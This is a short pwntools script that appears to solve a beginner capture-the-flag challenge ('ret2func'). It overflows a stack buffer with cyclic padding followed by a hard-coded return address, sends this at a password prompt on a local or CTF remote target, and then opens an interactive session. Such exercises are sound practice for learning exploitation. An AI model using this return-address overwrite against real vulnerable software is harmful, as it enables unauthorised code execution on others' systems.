#!/usr/bin/env python3
from pwn import *

context.update(arch="amd64", timeout=2)

if args.GDB:  # debug: local exploit with tmux/gef
    context.terminal = ["tmux", "splitw", "-h"]
    p = gdb.debug(
        "./1-stack-01-ret2func",
        """
        source ~/.gdbinit-gef.py
        b *main + 37
        continue
        """,
    )
elif args.LOCAL:
    p = process("./1-stack-01-ret2func")
else:
    p = remote("ctf.example.org", 4101)

# --- payload ici ---
payload = (
    b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaa"
    + b"\x56\x11\x40\x00\x00\x00\x00\x00"
)
p.sendlineafter("passe:", payload)
# print(p.recvall(timeout=1).decode())
p.interactive()
